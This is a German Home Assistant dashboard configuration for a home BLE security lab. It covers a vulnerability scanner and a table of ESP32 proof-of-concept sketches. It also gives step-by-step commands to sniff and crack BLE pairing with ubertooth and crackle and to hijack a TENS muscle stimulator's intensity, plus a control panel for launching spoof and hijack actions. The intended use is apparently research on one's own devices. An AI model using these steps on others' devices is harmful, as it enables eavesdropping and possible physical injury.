      # --- Erklärung der Korrelationen ---
      - type: grid
        cards:
          - type: markdown
            title: Was du in den Daten lesen kannst
            content: |
              **Apple-Continuity-Schwankungen** korrelieren mit
              Anwesenheit: AirPods/Watch/iPhone-Nähe broadcasten
              alle 100-1280 ms.

              **Random-Address-Ratio** zeigt wie privacy-aware die
              Umgebung ist. Iphone/Mac/Win11 nutzen Random; alte
              IoT-Geräte / Spielzeug bleiben public.

              **Ch37-only**: ubertooth-btle ohne Hopping hört nur
              den ersten der drei Adv-Channels — Geräte die nur
              auf 38 oder 39 senden, fehlen.

              **Persistente FindMy-Beacons** > 5 Min bei
              wechselnden RSSI-Werten = Hinweis auf einen
              AirTag der dir folgt (Auto/Tasche).

              **Strongest-RSSI-Sprünge** + neue MAC > 100 ms
              wiederholt = jemand bewegt sich gerade durch die
              Nähe (potentieller Tracking-Indikator).

  # =========================================================================
  # BLE Vuln-Scanner
  # =========================================================================
  - title: BLE Vuln-Scanner
    path: ble-vulns
    icon: mdi:shield-bug
    type: sections
    max_columns: 3
    sections:
      # --- Header + Counters ---
      - type: grid
        cards:
          - type: markdown
            content: |
              ## BLE Vulnerability Scanner
              Passive Erkennung anhand von Adv-Daten:
              **Manufacturer-IDs** (verwundbare SoC-Familien),
              **Service-UUIDs** (HID, Lock, Beacon),
              **GAP Appearance** (Schloss, Tastatur, Glucose...),
              **Pairing-Mode-Hints** (Public-MAC + LE Disco).

              Findings sind **passive Heuristiken** — Exploit-Reife
              musst du am Zielgerät nachweisen. PoC-Sketches liegen
              in `/opt/ubertooth-mqtt/poc/`.
          - type: horizontal-stack
            cards:
              - type: custom:mushroom-template-card
                primary: High
                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_vulns_high') }}"
                icon: mdi:shield-alert
                icon_color: red
                fill_container: true
              - type: custom:mushroom-template-card
                primary: Medium
                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_vulns_medium') }}"
                icon: mdi:shield-half-full
                icon_color: orange
                fill_container: true
              - type: custom:mushroom-template-card
                primary: Low
                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_vulns_low') }}"
                icon: mdi:shield-off-outline
                icon_color: amber
                fill_container: true
              - type: custom:mushroom-template-card
                primary: Info
                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_vulns_info') }}"
                icon: mdi:information-outline
                icon_color: blue
                fill_container: true

      # --- Findings-Tabelle ---
      - type: grid
        cards:
          - type: markdown
            title: Geflaggte Geräte (Top 20 nach Severity / Signal)
            content: |
              {%- set devs = state_attr('sensor.ubertooth_ble_monitor_ble_vuln_findings', 'devices') or [] %}
              {%- if devs|length == 0 %}
              _Noch keine Findings — Daemon sammelt für 30 s._
              {%- else %}
              | Sev | MAC | Kategorie | Vendor | RSSI | Findings |
              |---|---|---|---|---|---|
              {%- for d in devs[:20] %}
              {%- set icon = {'high':'🔴','medium':'🟠','low':'🟡','info':'🔵'}.get(d.max_severity, '⚪') %}
              | {{ icon }} | `{{ d.mac }}` | {{ d.category }} | {{ d.vendor }} | {{ d.rssi }} dBm | {{ d.findings | map(attribute='code') | list | join(', ') }} |
              {%- endfor %}
              {%- endif %}

      # --- Detail-View pro Gerät ---
      - type: grid
        cards:
          - type: markdown
            title: Detail-Findings (alle Severity ≥ Low)
            content: |
              {%- set devs = state_attr('sensor.ubertooth_ble_monitor_ble_vuln_findings', 'devices') or [] %}
              {%- for d in devs[:10] %}
              {%- set has_real = d.findings | selectattr('severity', 'in', ['high','medium','low']) | list | length > 0 %}
              {%- if has_real %}
              ### `{{ d.mac }}` — {{ d.category }} ({{ d.vendor }})
              **Name**: {{ d.name or '-' }} • **RSSI**: {{ d.rssi }} dBm
              {%- for f in d.findings %}
              - **[{{ f.severity | upper }}] {{ f.title }}**
                {{ f.detail }}
                {%- if f.poc_template %}
                → PoC: `/opt/ubertooth-mqtt/poc/{{ f.poc_template }}.ino`
                {%- endif %}
              {%- endfor %}
              {%- endif %}
              {%- endfor %}

      # --- PoC-Anleitungen ---
      - type: grid
        cards:
          - type: markdown
            title: PoC-Toolkit (ESP32)
            content: |
              Im NUC unter `/opt/ubertooth-mqtt/poc/` liegen 5 Arduino-Sketches.
              Hardware: ESP32-Devkit (kein ESP8266 — kein nativer BT).

              | Sketch | Wann | Was | Vuln-Code |
              |---|---|---|---|
              | `esp32_ble_replay.ino` | smart-Schloss / Beacon | exakter Adv-Replay mit gespoofter MAC | VULN_BLE_LOCK |
              | `esp32_ibeacon_spoof.ino` | bestehendes iBeacon | UUID/Major/Minor selbst senden | VULN_BEACON_REPLAY |
              | `esp32_apple_continuity_flood.ino` | eigene iPhones | Pop-up-Storm-Test (CVE-2020-9819) | INFO_APPLE_CONTINUITY |
              | `esp32_swift_pair_spoof.ino` | eigene Win11-PCs | Swift-Pair-Pop-up triggern | INFO_MS_SWIFT_PAIR |
              | `esp32_gatt_fuzzer.ino` | verwundbare SoC | connect+enumerate+arbitrary writes | VULN_SOC_VENDOR |

              **Workflow**: Im Vuln-Scanner-Findings-Block oben den
              `poc_template`-Wert ablesen → Sketch öffnen →
              `TARGET_MAC` / `TARGET_UUID` etc. anpassen → mit Arduino-IDE
              flashen → Serial Monitor (115200 bps) öffnen.
          - type: markdown
            title: Ubertooth Pairing-Sniff (für VULN_HID_LEGACY etc.)
            content: |
              ```bash
              # 1. Pairing-Capture starten (auf NUC, root):
              ubertooth-btle -f -t aa:bb:cc:dd:ee:ff -c /tmp/pair.pcap

              # 2. Auf dem Ziel: Pairing-Vorgang triggern
              #    (Schloss neu pairen, Tastatur neu koppeln, …)

              # 3. Crackle gegen den Capture:
              apt install crackle
              crackle -i /tmp/pair.pcap

              # Ausgabe bei Legacy-Pairing:
              # !!!
              # !!! TK FOUND: 000000
              # !!!
              # LTK derived: ...
              ```
              Wenn `crackle` einen TK/STK findet, nutzt das Ziel
              **LE Legacy Pairing** ohne Secure Connections — also
              passiver Mitschnitt + spätere Decryption möglich.

      # --- Vendor-Risiko-Übersicht ---
      - type: grid
        cards:
          - type: markdown
            title: Bekannte verwundbare SoC-Familien (Lookup-Tabelle)
            content: |
              | MfrID (LE) | Hersteller | Vuln-Familie |
              |---|---|---|
              | 0x000D | Texas Instruments CC2540/2640 | SweynTooth |
              | 0x0131 | Cypress PSoC 6/4 | SweynTooth |
              | 0x0211 | Telink TLSR8x | SweynTooth-like |
              | 0x02E5 | Espressif ESP32 (BT-Classic) | BrakTooth |
              | 0x004F | Nordic nRF5 SDK <15 | SweynTooth |
              | 0x0059 | Nordic nRF52 (alte FW) | SweynTooth-Window |

              **Quellen**: ASSET-Group SUTD (SweynTooth, BrakTooth),
              Bluetooth SIG Security Notices, NIST NVD.

  # =========================================================================
  # Medical-Device PoC (Bureau Veritas Pattern)
  # =========================================================================
  - title: Med-Device PoC
    path: med-device-poc
    icon: mdi:medical-bag
    type: sections
    max_columns: 2
    sections:
      # --- Header / Article-Reference ---
      - type: grid
        cards:
          - type: markdown
            content: |
              ## Medical-Device BLE Hijack (Bureau Veritas Pattern)

              **Quelle**: Bureau Veritas Cybersecurity (Lakshminaryanan & Nota)
              dokumentierten einen BLE-EMS/TENS-Muskelstimulator mit:
              - schreibbaren Handles 0x07/0x0B/0x10-0x13 ohne Auth
                (Privacy-Flag, Reconnection-Address, Intensity-Werte)
              - Hijacking via MITM moeglich
                (Original-Android-App verliert Verbindung)
              - DF2-Payload-Format Central→Peripheral: `str=NN\r\n`

              **Sicherheits-Impact**: Angreifer kann Stimulationsstärke
              ändern → bei höheren Werten gefährliche Muskelreaktionen.

              ### Reproduktions-Hardware (alles vorhanden)
              | Phase | Hardware | Tool |
              |---|---|---|
              | 1. Recon (passiv) | Ubertooth One | `ubertooth-btle -f -t MAC -c cap.pcap` |
              | 2. PCAP-Analyse | Wireshark/tshark | ATT-Protokoll dekodieren |
              | 3. Pairing-Crack | Ubertooth + crackle | `crackle -i cap.pcap` |
              | 4. Active GATT | Intel BT 9560 + bleak | `active_gatt_scan.py MAC` |
              | 5. PoC-Hijack | ESP32 | `esp32_med_device_hijack.ino` |

      - type: grid
        cards:
          - type: markdown
            title: Schritt 1 — Passive Recon (Ubertooth + Wireshark)
            content: |
              ```bash
              # auf NUC-HA, root:
              ubertooth-btle -f -t aa:bb:cc:dd:ee:ff -c /tmp/dut.pcap
              # parallel App auf Android starten, Programm ausführen
              # ^C nach 30-60 s
              tshark -r /tmp/dut.pcap -Y btatt -V | less
              # oder: wireshark /tmp/dut.pcap
              ```
              Im PCAP suchst du nach **WriteRequest**-Frames mit
              ASCII-lesbaren Payloads à la `str=NN\r\n` —
              zeigt Format und Ziel-Handle.

          - type: markdown
            title: Schritt 2 — Active GATT-Enumeration (bleak)
            content: |
              ```bash
              # Discover-Mode:
              sudo /opt/ubertooth-mqtt/active_gatt_scan.py --scan

              # Detail auf Ziel-MAC:
              sudo /opt/ubertooth-mqtt/active_gatt_scan.py aa:bb:cc:dd:ee:ff

              # Optional: Probe-Write testen (sicheres "str=0"):
              sudo /opt/ubertooth-mqtt/active_gatt_scan.py \
                  aa:bb:cc:dd:ee:ff --probe-write "str=0"
              ```
              Output zeigt schreibbare Char-UUIDs.
              Diese kopierst du in `esp32_med_device_hijack.ino`.

      - type: grid
        cards:
          - type: markdown
            title: Schritt 3 — Pairing-Crack (falls verschlüsselt)
            content: |
              ```bash
              # Wenn der DUT LE-Pairing nutzt:
              # 1. Pairing zwischen App + DUT NEU triggern
              #    (Bluetooth aus/an, neu pairen) während ubertooth-btle laeuft
              # 2. Capture stoppen, dann:
              crackle -i /tmp/dut.pcap

              # Wenn LE Legacy Pairing:
              #   !!!
              #   !!! TK FOUND: 000000
              #   !!!
              #   LTK derived: ...
              # -> spaeter mit -l <LTK> entschluesseln:
              crackle -i /tmp/dut.pcap -l <LTK> -o /tmp/dut_decrypted.pcap
              ```
              Wenn `crackle` einen TK findet: Gerät nutzt **LE Legacy Pairing**
              (Just Works/Passkey). Heutige Standards verlangen LE Secure
              Connections — Legacy ist crackbar.

          - type: markdown
            title: Schritt 4 — ESP32-PoC anpassen + flashen
            content: |
              In `/opt/ubertooth-mqtt/poc/esp32_med_device_hijack.ino`:
              ```cpp
              #define TARGET_MAC          "aa:bb:cc:dd:ee:ff"
              const char* TARGET_CHAR_UUID = "<aus active_gatt_scan>";
              const uint8_t INTENSITY_MIN = 5;
              const uint8_t INTENSITY_MAX = 25;   // Sicherheits-Cap
              ```
              In Arduino IDE 2.x:
              - Boards: ESP32 Dev Module
              - Port: dein ESP32 (`/dev/ttyUSB0` etc., NICHT der ESP8266)
              - Upload Speed: 921600
              - Hochladen, Serial Monitor 115200 öffnen

              Sketch macht: connect → sweep `str=5` bis `str=25` mit 1.5s Pause.
              Beobachte das DUT — bei BV-Pattern Zucken / Stimulation sichtbar.

      # --- Tools-Status ---
      - type: grid
        cards:
          - type: entities
            title: Installierte Tools
            entities:
              - type: section
                label: BLE Stack
              - entity: sensor.ubertooth_ble_monitor_ble_gerate_aktiv
                name: Ubertooth Live-BLE Devices
              - entity: sensor.ubertooth_ble_monitor_ble_vuln_findings
                name: Vuln-Findings Total
              - type: section
                label: WiFi Stack
              - entity: sensor.esp8266_wifi_worker_wifi1_wifi_probe_gerate
                name: WiFi Probe Sniffer (ESP8266)

          - type: markdown
            title: Tool-Pfade
            content: |
              | Tool | Pfad | Zweck |
              |---|---|---|
              | `crackle` | `/usr/local/bin/crackle` | LE-Legacy-Pairing crack |
              | `ubertooth-btle` | `/usr/bin/ubertooth-btle` | passive BLE sniff |
              | `tshark/wireshark` | `/usr/bin/tshark` | PCAP analyse |
              | `gatttool` | `/usr/bin/gatttool` | aktive GATT (legacy) |
              | `active_gatt_scan.py` | `/opt/ubertooth-mqtt/` | bleak-Frontend |
              | PoC-Sketches | `/opt/ubertooth-mqtt/poc/` | ESP32/ESP8266 |
              | Daemon | `systemctl status ubertooth-mqtt` | Vuln-Scanner-Daemon |

      # --- Ethical Reminder ---
      - type: grid
        cards:
          - type: markdown
            content: |
              ## Ethisch / Rechtlich
              - Aktive Tests **nur auf eigenen Geräten**.
              - Therapie-Hardware **nicht** im aktiven Therapie-Einsatz testen.
              - Keine fremde Infrastruktur scannen / spoofen
                (§202c StGB, §317 StGB, BGB §823).
              - Findings vor Veröffentlichung dem OEM melden
                (Coordinated Disclosure, 90 Tage).

  # =========================================================================
  # PoC Control (Device-Picker + Action-Picker)
  # =========================================================================
  - title: PoC Control
    path: poc-control
    icon: mdi:gamepad-variant
    type: sections
    max_columns: 2
    sections:
      - type: grid
        cards:
          - type: markdown
            content: |
              ## PoC Control Panel
              **Workflow**: 
              1. Worker waehlen (ESP32 für BLE-PoCs, ESP8266 für WiFi-Recon)
              2. Ziel-MAC aus Vuln-Scanner-Liste picken
              3. Aktion waehlen
              4. Parameter setzen (UUID/Payload/Intensity je nach Action)
              5. **Ausführen** — Worker bekommt MQTT-Command, Status erscheint live unten

              ⚠ **Nur eigene Geräte**. Stop-Button bei Bedarf.

          - type: entities
            title: Worker / Target / Action
            entities:
              - entity: input_select.poc_worker
                name: Worker
              - entity: input_select.poc_target_mac
                name: Ziel-MAC (aus Vuln-Scanner)
              - entity: input_select.poc_action
                name: Aktion
            state_color: true

      - type: grid
        cards:
          - type: entities
            title: Aktion-Parameter
            entities:
              - type: section
                label: gatt_fuzzer / med_device_hijack
              - input_text.poc_target_uuid
              - type: section
                label: ble_replay
              - input_text.poc_payload_hex
              - type: section
                label: ibeacon_spoof / swift_pair_spoof
              - input_text.poc_spoof_name
              - input_text.poc_ibeacon_uuid
              - input_number.poc_ibeacon_major
              - input_number.poc_ibeacon_minor
              - type: section
                label: med_device_hijack Intensity-Range
              - input_number.poc_intensity_min
              - input_number.poc_intensity_max

          - type: vertical-stack
            cards:
              - type: button
                name: ▶ Ausführen
                icon: mdi:play-circle
                tap_action:
                  action: call-service
                  service: script.run_poc_action
                hold_action:
                  action: more-info
              - type: button
                name: ⏹ Stop alle Worker
                icon: mdi:stop-circle
                tap_action:
                  action: call-service
                  service: script.run_poc_stop

      - type: grid
        cards:
          - type: entities
            title: Worker-Status (live)
            entities:
              - entity: sensor.esp32_poc_worker_worker1_mode
                name: ESP32 Worker1 Mode
              - entity: sensor.esp32_worker_last_result
                name: ESP32 Last Message
              - entity: sensor.esp8266_wifi_worker_wifi1_wifi_probe_gerate
                name: ESP8266 WiFi Probes
                secondary_info: last-changed

          - type: markdown
            title: Letzte Status-Nachrichten (ESP32)
            content: |
              {%- set s = state_attr('sensor.esp32_worker_last_result', 'msg') %}
              **Mode**: {{ state_attr('sensor.esp32_worker_last_result', 'mode') or 'idle' }}
              **Target**: {{ state_attr('sensor.esp32_worker_last_result', 'target') or '-' }}
              **Last**: `{{ s or '(no msg yet)' }}`
              **Mode-Age**: {{ state_attr('sensor.esp32_worker_last_result', 'mode_age_s') or 0 }}s

              ESP32 Scan-Result (wenn action=scan):
              {%- set found = state_attr('sensor.esp32_worker_last_result', 'found') or [] %}
              {% if found %}
              | MAC | RSSI | Name |
              |---|---|---|
              {%- for d in found[:15] %}
              | `{{ d.mac }}` | {{ d.rssi }} | {{ d.name }} |
              {%- endfor %}
              {% else %}
              _kein Scan-Ergebnis aktuell_
              {% endif %}

      - type: grid
        cards:
          - type: markdown
            title: ESP8266 Probe-Tabelle
            content: |
              {%- set probes = state_attr('sensor.esp8266_wifi_worker_wifi1_wifi_probe_gerate', 'devices') or [] %}
              {%- if probes %}
              | MAC | RSSI | SSID | Ch | Count |
              |---|---|---|---|---|
              {%- for p in probes[:20] %}
              | `{{ p.mac }}` | {{ p.rssi }} | `{{ p.ssid }}` | {{ p.channel }} | {{ p.count }} |
              {%- endfor %}
              {%- else %}
              _ESP8266-Worker noch nicht aktiv (flashen + WiFi-Connect abwarten)_
              {%- endif %}

  # =========================================================================
  # Tailnet (Headscale + Travel-Pi via WG)
  # =========================================================================
  - title: Tailnet
    path: tailnet
    icon: mdi:vpn
    type: sections
    max_columns: 2
    sections:
      # --- Travel Pi (WG-Proxy) ---
      - type: grid
        cards:
          - type: entities
            title: "Travel Pi (WG-Tunnel)"
            state_color: true
            entities:
              - entity: binary_sensor.travel_pi_online
                name: "Status (Handshake <3 min)"
              - entity: sensor.travel_pi_last_handshake
                name: "Letzter Handshake"
              - entity: sensor.travel_pi_endpoint
                name: "Letzter Endpoint (Pi-WAN)"
              - entity: sensor.travel_pi_rx
                name: "RX (vom Pi)"
              - entity: sensor.travel_pi_tx
                name: "TX (zum Pi)"
              - type: section
                label: "Tunnel-Adresse"
              - type: weblink
                name: "SSH 10.6.0.2"
                url: "ssh://pi@10.6.0.2"
                icon: mdi:console-network

          - type: markdown
            title: "Travel Pi Diagnose"
            content: |
              **Pi-Tunnel-IP:** `10.6.0.2`
              **WG-Server:** AdGuard (192.168.178.145) · `wg0` 10.6.0.1/24 · UDP 51820
              {% set tp = state_attr('sensor.tailnet_status','travel_pi') %}
              {%- if tp %}

              | Feld | Wert |
              |---|---|
              | Pubkey | `{{ tp.pubkey_short }}…` |
              | Allowed-IP | `{{ tp.allowed_ip }}` |
              | Online (WG) | {{ '🟢 ja' if tp.online else '🔴 nein' }} |
              | Reason | `{{ tp.reason }}` |
              | RX/TX | {{ (tp.rx_bytes / 1048576) | round(1) }} / {{ (tp.tx_bytes / 1048576) | round(1) }} MiB |
              {%- else %}
              _Keine WG-Daten verfügbar_
              {%- endif %}

      # --- Headscale Peers ---
      - type: grid
        cards:
          - type: entities
            title: "Headscale Peers (thesoc.internal)"
            state_color: true
            entities:
              - entity: sensor.headscale_peers_online
                name: "Peers Online"
              - entity: sensor.headscale_peers_total
                name: "Peers Gesamt"
              - type: section
                label: "Geräte"
              - entity: binary_sensor.headscale_nuc12_online
                name: "NUC12 (Windows)"
              - entity: binary_sensor.headscale_synnas_online
                name: "Synology"
              - entity: binary_sensor.headscale_iphone_online
                name: "iPhone Marcus"
              - entity: binary_sensor.headscale_capev2_online
                name: "CapeV2"
              - entity: binary_sensor.headscale_gw_online
                name: "Headscale-GW (Hetzner)"

          - type: markdown
            title: "Tailnet Live-Tabelle"
            content: |
              {% set hs = state_attr('sensor.tailnet_status','headscale') %}
              {%- if hs %}
              **Self:** `{{ hs.self.hostname }}` · {{ hs.self.ip }}

              | Peer | Tailnet-IP | OS | Status |
              |---|---|---|---|
              {%- for p in hs.peers %}
              | {{ p.hostname }} | `{{ p.ip }}` | {{ p.os }} | {{ '🟢' if p.online else '🔴' }} |
              {%- endfor %}

              _Update alle 30 s via `/usr/local/bin/tailnet-status.sh`_
              {%- else %}
              _Keine Headscale-Daten verfügbar_
              {%- endif %}
